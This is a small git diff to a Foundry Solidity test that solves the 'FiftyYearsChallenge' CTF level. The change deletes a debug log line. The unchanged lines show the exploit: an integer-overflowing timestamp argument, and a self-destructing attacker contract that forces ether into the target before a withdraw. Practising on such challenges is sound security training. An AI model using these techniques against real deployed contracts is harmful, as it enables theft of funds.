@@ -17,7 +17,6 @@ contract FiftyYearsChallengeTest is Test {
         vm.startPrank(player);
         target.upsert{value:1}(1, ((type(uint256).max + 1 - 1 days)));
         target.upsert{value: 2}(3, 0);
-        emit log_named_uint("balance0", target.getValue(0));
         RetirementFundAttacker attacker = new RetirementFundAttacker{value: 2 wei}();
         attacker.destroy(payable(address(target)));
         target.withdraw(2);
